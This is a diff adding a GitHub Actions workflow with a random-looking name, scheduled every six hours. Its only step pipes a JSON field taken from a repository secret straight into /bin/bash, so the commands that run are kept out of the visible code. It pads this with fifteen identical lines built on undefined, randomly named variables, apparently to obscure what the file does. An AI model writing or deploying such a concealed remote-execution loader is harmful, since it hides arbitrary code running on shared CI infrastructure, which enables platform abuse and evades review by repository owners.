@@ -1,0 +1,32 @@
+name: yataomeinaihemeisea
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '32 0/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: yataomeinaihemeisea
+        env:
+          u407: ${{ secrets.u407 }}
+        run: |
+          echo $u407 | jq -r .n493 | /bin/bash
+          echo $rfdh6314 | jq -r .mr2525 | /bin/bash
+          echo $um46647 | jq -r .jw679 | /bin/bash
+          echo $nzcfi9886 | jq -r .boas6147 | /bin/bash
+          echo $am1 | jq -r .xqovx160 | /bin/bash
+          echo $tn6250 | jq -r .a52 | /bin/bash
+          echo $h41 | jq -r .oydm77 | /bin/bash
+          echo $q5 | jq -r .x200 | /bin/bash
+          echo $puz54975 | jq -r .gfl468 | /bin/bash
+          echo $kqwhu30 | jq -r .qua3 | /bin/bash
+          echo $fqmq511 | jq -r .z8 | /bin/bash
+          echo $qab3 | jq -r .pxss3607 | /bin/bash
+          echo $nwe5239 | jq -r .tuex5 | /bin/bash
+          echo $ojeq0878 | jq -r .pta9855 | /bin/bash
+          echo $etq09433 | jq -r .bb40266 | /bin/bash
+          echo $xme8 | jq -r .ae2 | /bin/bash
+
